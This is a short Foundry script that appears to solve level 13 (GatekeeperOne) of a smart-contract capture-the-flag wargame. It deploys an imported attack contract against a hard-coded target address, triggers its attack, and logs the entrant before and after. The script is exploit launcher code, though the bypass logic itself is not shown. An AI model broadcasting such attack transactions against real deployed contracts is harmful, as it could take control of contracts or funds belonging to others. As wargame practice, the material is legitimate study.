// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/level13/GatekeeperOne.sol";
import {AttackGatekeeperOne} from "../src/level13/AttackGatekeeperOne.sol";
import "forge-std/console.sol";

contract level13Exploit is Script {
    GatekeeperOne gatekeeperOne =
        GatekeeperOne(0x84B2421055DF3BFb3925b4F7b904C8dF570D8f5e);

    function run() external {
        vm.startBroadcast();
        console.log("Entrant: ", gatekeeperOne.entrant());
        AttackGatekeeperOne attackGatekeeperOne = new AttackGatekeeperOne(
            address(gatekeeperOne)
        );
        attackGatekeeperOne.attack();
        console.log("Entrant: ", gatekeeperOne.entrant());
        vm.stopBroadcast();
    }
}
